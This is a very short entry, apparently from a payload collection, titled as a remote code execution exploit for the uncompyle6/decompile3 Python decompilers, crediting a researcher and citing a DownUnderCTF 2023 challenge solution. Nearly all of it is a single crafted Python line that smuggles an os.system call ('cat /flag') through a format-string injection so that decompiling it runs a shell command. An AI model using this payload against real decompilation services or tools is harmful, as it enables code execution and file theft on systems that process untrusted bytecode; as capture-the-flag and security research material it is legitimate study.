# Uncompyle6/decompile3 RCE

```py
# Credits: @hashkitten
foo('%{__import__("os").system("cat /flag")}', **x, y=1)
```

Source: https://github.com/DownUnderCTF/Challenges_2023_Public/blob/main/misc/daas/solution/exploit.py